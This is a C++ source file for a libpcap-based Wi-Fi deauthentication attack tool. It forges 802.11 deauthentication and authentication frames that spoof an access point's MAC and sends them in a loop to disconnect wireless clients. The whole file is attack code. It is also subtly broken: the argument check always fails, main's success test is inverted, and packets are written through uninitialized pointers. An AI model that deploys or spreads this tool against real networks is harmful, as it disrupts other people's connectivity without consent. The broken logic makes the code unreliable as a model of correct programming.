#include <pcap.h>
#include <stdio.h>
#include <stdbool.h>
#include "mac.h"
#include <map>
#include <stdlib.h>
#include <iostream>
#include <string>
#include <unistd.h>
#define FIXED_PARAMETERS 12

using namespace std; 

char* dev; 

void usuage(void) {
    printf("syntax : deauth-attack <interface> <ap mac> [<station mac> [-auth]]\nsample : deauth-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB\n"); 
}

Mac ap; 
Mac station; 
bool auth = false; 
bool isBroadcast = true; 

bool parse(int argc, char* argv[]){
    if(argc!=3 || argc!=4 || argc!=5) {
        usuage();
        return false;
    }

    station = Mac::broadcastMac(); 

    dev = argv[1];
    ap = Mac(argv[2]); 
    if(argc>=4){
        station = Mac(argv[3]);
        isBroadcast = false; 
    }
    if(argc==5){
        if(string(argv[4]) == "-auth"){
            auth = true; 
        }
        else {
            usuage(); 
            return false; 
        }
    }
    return true;
}

struct RADIO_TAP {
        u_int8_t        it_version;     /* set to 0 */
        u_int8_t        it_pad;
        u_int16_t       it_len;         /* entire length */
        u_int32_t       it_present;     /* fields present */
} __attribute__((__packed__));


struct BEACON_FRAME {
	u_int8_t frameControl[2];
	u_int16_t duration_id;
	u_int8_t destinationMac[6];
	u_int8_t sourceMac[6];
	u_int8_t bssid[6];
	u_int16_t seqCtrl;
} __attribute__((__packed__));


struct manage{
    uint16_t fixed;
}Manage;



struct ManageAuth{
    uint16_t algo;
    uint16_t seq;
    uint16_t status;
}__attribute__((__packed__));


struct Deauth_Packet{
    RADIO_TAP radiotap;
    BEACON_FRAME beacon;
    uint16_t fixed; 
}__attribute__((__packed__));

struct Auth_Packet{
    RADIO_TAP radiotap; 
    BEACON_FRAME beacon; 
    ManageAuth auth; 
}__attribute__((__packed__));



void send_packet(pcap_t *handle, char* packet, int size){ 
    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(packet), size);
    if (res != 0){
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }
}

void attack(pcap_t *handle){
    if(auth==false){
        Deauth_Packet *packet;  
        packet->radiotap.it_version = 0; 
        packet->radiotap.it_pad = 0; 
        packet->radiotap.it_len = htons(sizeof(RADIO_TAP)); 
        packet->radiotap.it_present = htonl(0x28000); 
        packet->beacon.frameControl[0] = 0xc0;
        packet->beacon.frameControl[1] = 0; 
        packet->beacon.duration_id = 0; 
        uint8_t* srcmac = static_cast<uint8_t*>(ap); 
        uint8_t* dstmac = static_cast<uint8_t*>(station); 
        packet->fixed = 0x0007; 
        packet->beacon.seqCtrl = 0;
        
        if(isBroadcast){
            for(int i=0;i<6;i++) packet->beacon.destinationMac[i] = dstmac[i];  
            for(int i=0;i<6;i++) packet->beacon.bssid[i] = srcmac[i];  
            for(int i=0;i<6;i++) packet->beacon.sourceMac[i] = srcmac[i];

            int cnt = 20; 
            while(cnt--){
                send_packet(handle, (char*)packet, sizeof(Deauth_Packet));
                sleep(1);  
            }
        }

        else { 
            int cnt = 20; 
            while(cnt--){
                for(int i=0;i<6;i++) packet->beacon.destinationMac[i] = dstmac[i];  
                for(int i=0;i<6;i++) packet->beacon.bssid[i] = srcmac[i];  
                for(int i=0;i<6;i++) packet->beacon.sourceMac[i] = srcmac[i];
                send_packet(handle, (char*)packet, sizeof(Deauth_Packet));
                sleep(1);  
                for(int i=0;i<6;i++) packet->beacon.destinationMac[i] = srcmac[i];  
                for(int i=0;i<6;i++) packet->beacon.sourceMac[i] = dstmac[i];
                send_packet(handle, (char*)packet, sizeof(Deauth_Packet));
                sleep(1); 
            }
        }
    }


    if(auth==true){
        Auth_Packet *packet; 
        packet->radiotap.it_version = 0; 
        packet->radiotap.it_pad = 0; 
        packet->radiotap.it_len = htons(sizeof(RADIO_TAP)); 
        packet->radiotap.it_present = htonl(0x28000); 
        packet->beacon.frameControl[0] = 0xb0;
        packet->beacon.frameControl[1] = 0; 
        packet->beacon.duration_id = 0; 
        uint8_t* srcmac = static_cast<uint8_t*>(ap); 
        uint8_t* dstmac = static_cast<uint8_t*>(station); 
        for(int i=0;i<6;i++) packet->beacon.destinationMac[i] = dstmac[i];  
        for(int i=0;i<6;i++) packet->beacon.bssid[i] = srcmac[i];  
        for(int i=0;i<6;i++) packet->beacon.sourceMac[i] = srcmac[i];
        packet->beacon.seqCtrl = 0; 
        packet->auth.algo = 0; 
        packet->auth.seq = 0x0001; 
        packet->auth.status = 0; 
        int cnt = 20; 
        while(cnt--){
            send_packet(handle, (char*)packet, sizeof(Deauth_Packet));
            sleep(1);  
        }
    }
}


int main(int argc, char* argv[]) {
    if(parse(argc, argv)){
        return -1; 
    }
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *handle = pcap_open_live(dev, BUFSIZ, 1, 100, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }
    attack(handle);
}